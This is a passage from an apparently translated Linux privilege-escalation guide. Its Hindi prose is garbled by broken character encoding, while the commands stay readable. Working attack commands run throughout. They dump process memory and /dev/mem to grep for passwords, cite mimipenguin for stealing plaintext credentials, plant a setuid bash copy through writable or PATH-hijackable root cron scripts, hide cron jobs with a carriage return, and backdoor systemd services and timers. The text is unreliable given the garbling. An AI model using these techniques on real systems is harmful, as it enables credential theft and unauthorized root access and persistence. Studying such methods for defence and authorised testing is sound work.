рдЬрд╛рдирдХрд╛рд░реА рдХрд╛ рдЙрдкрдпреЛрдЧ **рдореЗрдо рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдЦреЛрдЬрдиреЗ рдФрд░ рд╕рднреА рдкрдврд╝рдиреЗ рдпреЛрдЧреНрдп рдХреНрд╖реЗрддреНрд░реЛрдВ рдХреЛ рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдбрдВрдк рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП** рдХрд░рддреЗ рд╣реИрдВред
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` рд╕рд┐рд╕реНрдЯрдо рдХреА **рднреМрддрд┐рдХ** рдореЗрдореЛрд░реА рддрдХ рдкрд╣реБрдБрдЪ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ, рди рдХрд┐ рдЖрднрд╛рд╕реА рдореЗрдореЛрд░реА рддрдХред рдХрд░реНрдиреЗрд▓ рдХреА рдЖрднрд╛рд╕реА рдкрддрд╛ рд╕реНрдерд╛рди рдХреЛ /dev/kmem рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХреНрд╕реЗрд╕ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред\
рдЖрдо рддреМрд░ рдкрд░, `/dev/mem` рдХреЗрд╡рд▓ **root** рдФрд░ **kmem** рд╕рдореВрд╣ рджреНрд╡рд╛рд░рд╛ рдкрдврд╝рд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for linux

ProcDump рдПрдХ Linux рдореЗрдВ Sysinternals рдЯреВрд▓реНрд╕ рдХреЗ рд╕реВрдЯ рд╕реЗ рдХреНрд▓рд╛рд╕рд┐рдХ ProcDump рдЯреВрд▓ рдХрд╛ рдкреБрдирдГ рдЖрд╡рд┐рд╖реНрдХрд╛рд░ рд╣реИ рдЬреЛ Windows рдХреЗ рд▓рд┐рдП рд╣реИред рдЗрд╕реЗ [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux) рдкрд░ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВред
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Tools

рдПрдХ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреА рдореЗрдореЛрд░реА рдХреЛ рдбрдВрдк рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

* [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
* [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_рдЖрдк рдореИрдиреНрдпреБрдЕрд▓ рд░реВрдк рд╕реЗ рд░реВрдЯ рдЖрд╡рд╢реНрдпрдХрддрд╛рдУрдВ рдХреЛ рд╣рдЯрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЕрдкрдиреЗ рджреНрд╡рд╛рд░рд╛ рд╕реНрд╡рд╛рдорд┐рддреНрд╡ рд╡рд╛рд▓реА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдбрдВрдк рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ
* Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (рд░реВрдЯ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ)

### Credentials from Process Memory

#### Manual example

рдпрджрд┐ рдЖрдк рдкрд╛рддреЗ рд╣реИрдВ рдХрд┐ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдЪрд▓ рд░рд╣реА рд╣реИ:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
рдЖрдк рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдбрдВрдк рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреА рдореЗрдореЛрд░реА рдХреЛ рдбрдВрдк рдХрд░рдиреЗ рдХреЗ рд╡рд┐рднрд┐рдиреНрди рддрд░реАрдХреЛрдВ рдХреЛ рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдкрд┐рдЫрд▓реЗ рдЕрдиреБрднрд╛рдЧреЛрдВ рдХреЛ рджреЗрдЦреЗрдВ) рдФрд░ рдореЗрдореЛрд░реА рдХреЗ рдЕрдВрджрд░ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреА рдЦреЛрдЬ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

рдпрд╣ рдЙрдкрдХрд░рдг [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) **рдореЗрдореЛрд░реА рд╕реЗ рд╕реНрдкрд╖реНрдЯ рдкрд╛рда рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕** рдФрд░ рдХреБрдЫ **рдЕрдЪреНрдЫреА рддрд░рд╣ рд╕реЗ рдЬреНрдЮрд╛рдд рдлрд╝рд╛рдЗрд▓реЛрдВ** рд╕реЗ **рдЪреЛрд░реА** рдХрд░реЗрдЧрд╛ред рдЗрд╕реЗ рд╕рд╣реА рддрд░реАрдХреЗ рд╕реЗ рдХрд╛рдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд░реВрдЯ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИред

| рд╡рд┐рд╢реЗрд╖рддрд╛                                           | рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХрд╛ рдирд╛рдо         |
| ------------------------------------------------- | -------------------- |
| GDM рдкрд╛рд╕рд╡рд░реНрдб (Kali рдбреЗрд╕реНрдХрдЯреЙрдк, Debian рдбреЗрд╕реНрдХрдЯреЙрдк)       | gdm-password         |
| Gnome рдХреАрд░рд┐рдВрдЧ (Ubuntu рдбреЗрд╕реНрдХрдЯреЙрдк, ArchLinux рдбреЗрд╕реНрдХрдЯреЙрдк) | gnome-keyring-daemon |
| LightDM (Ubuntu рдбреЗрд╕реНрдХрдЯреЙрдк)                          | lightdm              |
| VSFTPd (рд╕рдХреНрд░рд┐рдп FTP рдХрдиреЗрдХреНрд╢рди)                   | vsftpd               |
| Apache2 (рд╕рдХреНрд░рд┐рдп HTTP рдмреЗрд╕рд┐рдХ рдСрде рд╕рддреНрд░)         | apache2              |
| OpenSSH (рд╕рдХреНрд░рд┐рдп SSH рд╕рддреНрд░ - Sudo рдЙрдкрдпреЛрдЧ)        | sshd:                |

#### Search Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Scheduled/Cron jobs

рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдХреЛрдИ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд╛рд░реНрдп рдХрдордЬреЛрд░ рд╣реИред рд╢рд╛рдпрдж рдЖрдк рдПрдХ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХрд╛ рд▓рд╛рдн рдЙрдард╛ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рд░реВрдЯ рджреНрд╡рд╛рд░рд╛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХреА рдЬрд╛ рд░рд╣реА рд╣реИ (рд╡рд╛рдЗрд▓реНрдбрдХрд╛рд░реНрдб vuln? рдХреНрдпрд╛ рд░реВрдЯ рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛рдиреЗ рд╡рд╛рд▓реА рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рд╕рд┐рдореНрд▓рд┐рдВрдХреНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рд░реВрдЯ рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛рдиреЗ рд╡рд╛рд▓реА рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдореЗрдВ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдлрд╝рд╛рдЗрд▓реЗрдВ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ?)ред
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron path

рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, _/etc/crontab_ рдХреЗ рдЕрдВрджрд░ рдЖрдк PATH рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ "user" рдХреЗ рдкрд╛рд╕ /home/user рдкрд░ рд▓рд┐рдЦрдиреЗ рдХреЗ рдЕрдзрд┐рдХрд╛рд░ рд╣реИрдВ_)

рдпрджрд┐ рдЗрд╕ рдХреНрд░реЙрдирдЯреИрдм рдХреЗ рдЕрдВрджрд░ рд░реВрдЯ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдмрд┐рдирд╛ рдкрде рд╕реЗрдЯ рдХрд┐рдП рдХрд┐рд╕реА рдХрдорд╛рдВрдб рдпрд╛ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рддрд╛ рд╣реИред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП: _\* \* \* \* root overwrite.sh_\
рддреЛ, рдЖрдк рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рд░реВрдЯ рд╢реЗрд▓ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron using a script with a wildcard (Wildcard Injection)

рдпрджрд┐ рдПрдХ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдЬрд┐рд╕реЗ рд░реВрдЯ рджреНрд╡рд╛рд░рд╛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдПрдХ рдХрдорд╛рдВрдб рдХреЗ рдЕрдВрджрд░ тАЬ**\***тАЭ рд╣реИ, рддреЛ рдЖрдк рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдЕрдкреНрд░рддреНрдпрд╛рд╢рд┐рдд рдЪреАрдЬреЗрдВ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рдЬреИрд╕реЗ privesc)ред рдЙрджрд╛рд╣рд░рдг:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**рдпрджрд┐ рд╡рд╛рдЗрд▓реНрдбрдХрд╛рд░реНрдб рдХреЗ рдкрд╣рд▓реЗ рдПрдХ рдкрде рд╣реИ рдЬреИрд╕реЗ** _**/some/path/\***_ **, рддреЛ рдпрд╣ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдирд╣реАрдВ рд╣реИ (рдпрд╣рд╛рдВ рддрдХ рдХрд┐** _**./\***_ **рднреА рдирд╣реАрдВ рд╣реИ)ред**

рдЕрдзрд┐рдХ рд╡рд╛рдЗрд▓реНрдбрдХрд╛рд░реНрдб рд╢реЛрд╖рдг рдЪрд╛рд▓реЛрдВ рдХреЗ рд▓рд┐рдП рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреГрд╖реНрда рдкрдврд╝реЗрдВ:

{% content-ref url="wildcards-spare-tricks.md" %}
[wildcards-spare-tricks.md](wildcards-spare-tricks.md)
{% endcontent-ref %}

### рдХреНрд░реЛрди рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдУрд╡рд░рд░рд╛рдЗрдЯрд┐рдВрдЧ рдФрд░ рд╕рд┐рдореНрд▓рд┐рдВрдХ

рдпрджрд┐ рдЖрдк **рдПрдХ рдХреНрд░реЛрди рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** рдЬрд┐рд╕реЗ рд░реВрдЯ рджреНрд╡рд╛рд░рд╛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдЖрдк рдмрд╣реБрдд рдЖрд╕рд╛рдиреА рд╕реЗ рдПрдХ рд╢реЗрд▓ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
рдпрджрд┐ рд░реВрдЯ рджреНрд╡рд╛рд░рд╛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдПрдХ **рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреА рд╣реИ рдЬрд╣рд╛рдБ рдЖрдкрдХреЗ рдкрд╛рд╕ рдкреВрд░реНрдг рдкрд╣реБрдВрдЪ рд╣реИ**, рддреЛ рд╢рд╛рдпрдж рдЙрд╕ рдлрд╝реЛрд▓реНрдбрд░ рдХреЛ рд╣рдЯрд╛рдирд╛ рдФрд░ **рдЖрдкрдХреЗ рджреНрд╡рд╛рд░рд╛ рдирд┐рдпрдВрддреНрд░рд┐рдд рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреА рд╕реЗрд╡рд╛ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рджреВрд╕рд░реЗ рдлрд╝реЛрд▓реНрдбрд░ рдХреЗ рд▓рд┐рдП рдПрдХ рд╕рд┐рдореНрд▓рд┐рдВрдХ рдлрд╝реЛрд▓реНрдбрд░ рдмрдирд╛рдирд╛** рдЙрдкрдпреЛрдЧреА рд╣реЛ рд╕рдХрддрд╛ рд╣реИред
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Frequent cron jobs

рдЖрдк рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреА рдирд┐рдЧрд░рд╛рдиреА рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рдЙрди рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреА рдЦреЛрдЬ рдХреА рдЬрд╛ рд╕рдХреЗ рдЬреЛ рд╣рд░ 1, 2 рдпрд╛ 5 рдорд┐рдирдЯ рдореЗрдВ рдЪрд▓ рд░рд╣реА рд╣реИрдВред рд╢рд╛рдпрдж рдЖрдк рдЗрд╕рдХрд╛ рд▓рд╛рдн рдЙрдард╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдмрдврд╝рд╛ рд╕рдХрддреЗ рд╣реИрдВред

рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, **1 рдорд┐рдирдЯ рдХреЗ рд▓рд┐рдП рд╣рд░ 0.1 рд╕реЗрдХрдВрдб рдХреА рдирд┐рдЧрд░рд╛рдиреА рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП**, **рдХрдо рдЪрд▓рд╛рдП рдЧрдП рдХрдорд╛рдВрдб рдХреЗ рдЕрдиреБрд╕рд╛рд░ рдХреНрд░рдордмрджреНрдз рдХрд░реЗрдВ** рдФрд░ рдЙрди рдХрдорд╛рдВрдб рдХреЛ рд╣рдЯрд╛ рджреЗрдВ рдЬреЛ рд╕рдмрд╕реЗ рдЕрдзрд┐рдХ рдЪрд▓рд╛рдП рдЧрдП рд╣реИрдВ, рдЖрдк рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**рдЖрдк рднреА** [**pspy**](https://github.com/DominicBreuker/pspy/releases) **рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** (рдпрд╣ рд╣рд░ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреА рдирд┐рдЧрд░рд╛рдиреА рдХрд░реЗрдЧрд╛ рдФрд░ рд╕реВрдЪреАрдмрджреНрдз рдХрд░реЗрдЧрд╛ рдЬреЛ рд╢реБрд░реВ рд╣реЛрддреА рд╣реИ)ред

### рдЕрджреГрд╢реНрдп рдХреНрд░реЛрди рдЬреЙрдмреНрд╕

рдПрдХ рдХреНрд░реЛрдирдЬреЙрдм рдмрдирд╛рдирд╛ рд╕рдВрднрд╡ рд╣реИ **рдПрдХ рдЯрд┐рдкреНрдкрдгреА рдХреЗ рдмрд╛рдж рдХреИрд░рд┐рдЬ рд░рд┐рдЯрд░реНрди рдбрд╛рд▓рдХрд░** (рдмрд┐рдирд╛ рдиреНрдпреВрд▓рд╛рдЗрди рдХреИрд░реЗрдХреНрдЯрд░ рдХреЗ), рдФрд░ рдХреНрд░реЛрди рдЬреЙрдм рдХрд╛рдо рдХрд░реЗрдЧрд╛ред рдЙрджрд╛рд╣рд░рдг (рдХреИрд░рд┐рдЬ рд░рд┐рдЯрд░реНрди рдХреИрд░реЗрдХреНрдЯрд░ рдкрд░ рдзреНрдпрд╛рди рджреЗрдВ):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Services

### Writable _.service_ files

рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдЖрдк рдХрд┐рд╕реА `.service` рдлрд╝рд╛рдЗрд▓ рдХреЛ рд▓рд┐рдЦ рд╕рдХрддреЗ рд╣реИрдВ, рдпрджрд┐ рдЖрдк рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рдЖрдк рдЗрд╕реЗ **рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** рддрд╛рдХрд┐ рдпрд╣ **рдЖрдкрдХрд╛** **рдмреИрдХрдбреЛрд░** **рдЪрд▓рд╛рдП** рдЬрдм рд╕реЗрд╡рд╛ **рд╢реБрд░реВ** рд╣реЛрддреА рд╣реИ, **рдлрд┐рд░ рд╕реЗ рд╢реБрд░реВ** рд╣реЛрддреА рд╣реИ рдпрд╛ **рд░реЛрдХ рджреА** рдЬрд╛рддреА рд╣реИ (рд╢рд╛рдпрдж рдЖрдкрдХреЛ рдорд╢реАрди рдХреЗ рдкреБрдирд░рд╛рд░рдВрдн рд╣реЛрдиреЗ рдХрд╛ рдЗрдВрддрдЬрд╛рд░ рдХрд░рдирд╛ рдкрдбрд╝реЗ)ред\
рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, .service рдлрд╝рд╛рдЗрд▓ рдХреЗ рдЕрдВрджрд░ рдЕрдкрдиреЗ рдмреИрдХрдбреЛрд░ рдХреЛ **`ExecStart=/tmp/script.sh`** рдХреЗ рд╕рд╛рде рдмрдирд╛рдПрдВред

### Writable service binaries

рдпрд╛рдж рд░рдЦреЗрдВ рдХрд┐ рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ **рд╕реЗрд╡рд╛рдУрдВ рджреНрд╡рд╛рд░рд╛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдмрд╛рдЗрдирд░реА рдкрд░ рд▓рд┐рдЦрдиреЗ рдХреА рдЕрдиреБрдорддрд┐** рд╣реИ, рддреЛ рдЖрдк рдЙрдиреНрд╣реЗрдВ рдмреИрдХрдбреЛрд░ рдХреЗ рд▓рд┐рдП рдмрджрд▓ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рдЬрдм рд╕реЗрд╡рд╛рдПрдВ рдлрд┐рд░ рд╕реЗ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрдВ, рддреЛ рдмреИрдХрдбреЛрд░ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрдВред

### systemd PATH - Relative Paths

рдЖрдк **systemd** рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ PATH рдХреЛ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
systemctl show-environment
```
рдпрджрд┐ рдЖрдк рдкрд╛рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдк рдкрде рдХреЗ рдХрд┐рд╕реА рднреА рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ **рд▓рд┐рдЦ** рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рдЖрдк **рдЕрдзрд┐рдХрд╛рд░ рдмрдврд╝рд╛рдиреЗ** рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВред рдЖрдкрдХреЛ рд╕реЗрд╡рд╛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдлрд╝рд╛рдЗрд▓реЛрдВ рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛ рд░рд╣реЗ **рд╕рд╛рдкреЗрдХреНрд╖ рдкрдереЛрдВ** рдХреА рдЦреЛрдЬ рдХрд░рдиреА рд╣реЛрдЧреА рдЬреИрд╕реЗ:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
рдлрд┐рд░, рдПрдХ **executables** рдмрдирд╛рдПрдВ рдЬрд┐рд╕рдХрд╛ **рдирд╛рдо рдЙрд╕ рд╕рд╛рдкреЗрдХреНрд╖ рдкрде рдмрд╛рдЗрдирд░реА** рдХреЗ рд╕рдорд╛рди рд╣реЛ рдЬреЛ systemd PATH рдлрд╝реЛрд▓реНрдбрд░ рдХреЗ рдЕрдВрджрд░ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдЖрдк рд▓рд┐рдЦ рд╕рдХрддреЗ рд╣реИрдВ, рдФрд░ рдЬрдм рд╕реЗрд╡рд╛ рдХреЛ рдХрдордЬреЛрд░ рдХреНрд░рд┐рдпрд╛ (**Start**, **Stop**, **Reload**) рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдЖрдкрдХрд╛ **backdoor рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрдЧрд╛** (рдЕрдзрд┐рдХрд╛рд░рд╣реАрди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЖрдорддреМрд░ рдкрд░ рд╕реЗрд╡рд╛рдУрдВ рдХреЛ рд╢реБрд░реВ/рд░реЛрдХ рдирд╣реАрдВ рд╕рдХрддреЗ рд▓реЗрдХрд┐рди рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдЖрдк `sudo -l` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ)ред

**рд╕реЗрд╡рд╛рдУрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдиреЗрдВ `man systemd.service` рдХреЗ рд╕рд╛рдеред**

## **Timers**

**Timers** systemd рдпреВрдирд┐рдЯ рдлрд╝рд╛рдЗрд▓реЗрдВ рд╣реИрдВ рдЬрд┐рдирдХрд╛ рдирд╛рдо `**.timer**` рдкрд░ рд╕рдорд╛рдкреНрдд рд╣реЛрддрд╛ рд╣реИ рдЬреЛ `**.service**` рдлрд╝рд╛рдЗрд▓реЛрдВ рдпрд╛ рдШрдЯрдирд╛рдУрдВ рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░рддрд╛ рд╣реИред **Timers** рдХреЛ рдХреНрд░реЙрди рдХреЗ рд╡рд┐рдХрд▓реНрдк рдХреЗ рд░реВрдк рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдЗрдирдореЗрдВ рдХреИрд▓реЗрдВрдбрд░ рд╕рдордп рдШрдЯрдирд╛рдУрдВ рдФрд░ рдореЛрдиреЛрдЯреЛрдирд┐рдХ рд╕рдордп рдШрдЯрдирд╛рдУрдВ рдХреЗ рд▓рд┐рдП рдЕрдВрддрд░реНрдирд┐рд╣рд┐рдд рд╕рдорд░реНрдерди рд╣реЛрддрд╛ рд╣реИ рдФрд░ рдЗрдиреНрд╣реЗрдВ рдЕрд╕рд┐рдВрдХреНрд░реЛрдирд╕ рд░реВрдк рд╕реЗ рдЪрд▓рд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

рдЖрдк рд╕рднреА рдЯрд╛рдЗрдорд░реНрд╕ рдХреЛ рд╕реВрдЪреАрдмрджреНрдз рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
systemctl list-timers --all
```
### Writable timers

рдпрджрд┐ рдЖрдк рдПрдХ рдЯрд╛рдЗрдорд░ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рдЖрдк рдЗрд╕реЗ systemd.unit рдХреЗ рдХреБрдЫ рдЕрд╕реНрддрд┐рддреНрд╡реЛрдВ (рдЬреИрд╕реЗ `.service` рдпрд╛ `.target`) рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВред
```bash
Unit=backdoor.service
```
In the documentation you can read what the Unit is:

